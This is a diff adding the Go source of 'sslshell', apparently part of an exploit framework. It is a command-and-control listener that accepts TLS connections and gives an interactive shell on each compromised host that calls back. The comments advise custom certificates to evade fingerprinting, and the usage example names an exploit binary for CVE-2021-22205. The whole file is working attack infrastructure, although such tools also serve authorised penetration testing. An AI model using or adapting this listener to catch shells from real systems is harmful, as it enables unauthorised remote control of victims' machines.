@@ -1,0 +1,152 @@
+// sslshell is a simple c2 that listens for incoming ssl/tls connections in order to establish a reverse shell.
+//
+// The sslshell can generate it's own server certificate, or the user can provide their own. It's often a smart idea
+// to provide unique certificate to avoid fingerprinting. To generate the required files you can use openssl:
+//
+//	openssl genpkey -algorithm RSA -out private_key.pem
+//	openssl req -new -key private_key.pem -out csr.pem
+//	openssl x509 -req -days 365 -in csr.pem -signkey private_key.pem -out certificate.pem
+//
+// The private_key.pem and certificate.pem are then provided on the command line like so:
+//
+//	./cve-2021-22205_linux-arm64 -e -sslShellServer.PrivateKeyFile private_key.pem -sslShellServer.ServerField certificate.pem ...
+//
+// If a certificate is not provide, this c2 will generate one on the fly, but it is likely vulnerable to fingerprinting.
+//
+// This c2 can accept multiple connections, but it currently can only handle interacting with one at a time.
+package sslshell
+
+import (
+	"crypto/tls"
+	"flag"
+	"fmt"
+	"net"
+	"strings"
+	"sync"
+	"time"
+
+	"github.com/vulncheck-oss/go-exploit/c2/cli"
+	"github.com/vulncheck-oss/go-exploit/encryption"
+	"github.com/vulncheck-oss/go-exploit/output"
+)
+
+type Server struct {
+	// The socket the server is listening on
+	Listener net.Listener
+	// The file path to the user provided private key (if provided)
+	PrivateKeyFile string
+	// The file path to the user provided certificate (if provided)
+	CertificateFile string
+}
+
+var singleton *Server
+
+// Get a singleton instance of the sslserver c2.
+func GetInstance() *Server {
+	if singleton == nil {
+		singleton = new(Server)
+	}
+
+	return singleton
+}
+
+// Create the flags for accepting custom TLS configurations.
+func (shellServer *Server) CreateFlags() {
+	flag.StringVar(&shellServer.PrivateKeyFile, "sslShellServer.PrivateKeyFile", "", "A private key to use with the SSL server")
+	flag.StringVar(&shellServer.CertificateFile, "sslShellServer.CertificateFile", "", "The certificate to use with the SSL server")
+}
+
+// Parses the user provided files or generates the certificate files and starts
+// the TLS listener on the user provided IP/port.
+func (shellServer *Server) Init(ipAddr string, port int, isClient bool) bool {
+	if isClient {
+		output.PrintFrameworkError("Called SSLShellServer as a client. Use lhost and lport.")
+
+		return false
+	}
+
+	var ok bool
+	var err error
+	var certificate tls.Certificate
+	if len(shellServer.CertificateFile) != 0 && len(shellServer.PrivateKeyFile) != 0 {
+		certificate, err = tls.LoadX509KeyPair(shellServer.CertificateFile, shellServer.PrivateKeyFile)
+		if err != nil {
+			output.PrintfFrameworkError("Error loading certificate: %s", err.Error())
+
+			return false
+		}
+	} else {
+		output.PrintFrameworkStatus("Certificate not provided. Generating a TLS Certificate")
+		certificate, ok = encryption.GenerateCertificate()
+		if !ok {
+			return false
+		}
+	}
+
+	output.PrintfFrameworkStatus("Starting TLS listener on %s:%d", ipAddr, port)
+	shellServer.Listener, err = tls.Listen(
+		"tcp", fmt.Sprintf("%s:%d", ipAddr, port), &tls.Config{
+			Certificates: []tls.Certificate{certificate},
+			// We have no control over the SSL versions supported on the remote target. Be permissive for more targets.
+			MinVersion: tls.VersionSSL30,
+		})
+	if err != nil {
+		output.PrintfError("Error loading certificate: %s", err.Error())
+
+		return false
+	}
+
+	return true
+}
+
+// Listens for incoming SSL/TLS connections spawns a reverse shell handler for each new connection.
+func (shellServer *Server) Run(timeout int) {
+	// mutex for user input
+	var cliLock sync.Mutex
+
+	// track if we got a shell or not
+	success := false
+
+	// terminate the server if no shells come in within timeout seconds
+	go func() {
+		time.Sleep(time.Duration(timeout) * time.Second)
+		if !success {
+			output.PrintFrameworkError("Timeout met. Shutting down shell listener.")
+			shellServer.Listener.Close()
+		}
+	}()
+
+	// Accept arbitrary connections. In the future we need something for the
+	// user to select which connection to make active
+	for {
+		client, err := shellServer.Listener.Accept()
+		if err != nil {
+			if !strings.Contains(err.Error(), "use of closed network connection") {
+				output.PrintFrameworkError(err.Error())
+			}
+
+			return
+		}
+		success = true
+		output.PrintfFrameworkSuccess("Caught new shell from %v", client.RemoteAddr())
+		go handleSimpleConn(client, &cliLock, client.RemoteAddr())
+	}
+}
+
+func handleSimpleConn(conn net.Conn, cliLock *sync.Mutex, remoteAddr net.Addr) {
+	// connections will stack up here. Currently that will mean a race
+	// to the next connection but we can add in attacker handling of
+	// connections latter
+	cliLock.Lock()
+	defer cliLock.Unlock()
+
+	// close the connection when the shell is complete
+	defer conn.Close()
+
+	output.PrintfFrameworkStatus("Active shell from %v", remoteAddr)
+
+	cli.Basic(conn)
+
+	// we done here
+	output.PrintfFrameworkStatus("Connection closed %v", remoteAddr)
+}
